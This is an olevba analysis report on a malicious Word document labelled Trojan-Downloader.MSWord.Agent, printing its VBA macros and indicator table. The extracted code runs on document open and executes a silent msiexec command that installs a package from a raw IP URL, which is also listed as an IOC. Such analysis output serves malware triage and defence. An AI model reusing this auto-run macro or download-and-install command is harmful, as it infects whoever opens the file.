olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan-Downloader.MSWord.Agent.chm
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Trojan-Downloader.MSWord.Agent.chm - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub document_open()
UserForm2.Show
End Sub
-------------------------------------------------------------------------------
VBA MACRO UserForm1.frm 
in file: ./Trojan-Downloader.MSWord.Agent.chm - OLE stream: 'Macros/VBA/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO UserForm2.frm 
in file: ./Trojan-Downloader.MSWord.Agent.chm - OLE stream: 'Macros/VBA/UserForm2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub UserForm_Activate()
Dim time
time = Format(Now + TimeSerial(0, 0, 19), "hh:mm")


Shell Replace(UserForm1.TextBox1.Text, "12:12", time)
Unload Me
End Sub

-------------------------------------------------------------------------------
VBA FORM STRING IN './Trojan-Downloader.MSWord.Agent.chm' - OLE stream: 'Macros/UserForm1/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
msiexec /q step1=commonl step2=files /i http://149.5.209.70/02m
-------------------------------------------------------------------------------
VBA FORM Variable "b'TextBox1'" IN './Trojan-Downloader.MSWord.Agent.chm' - OLE stream: 'Macros/UserForm1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
b'msiexec /q step1=commonl step2=files /i http://149.5.209.70/02m'
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |document_open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |http://149.5.209.70/|URL                                          |
|          |02m                 |                                             |
|IOC       |149.5.209.70        |IPv4 address                                 |
+----------+--------------------+---------------------------------------------+

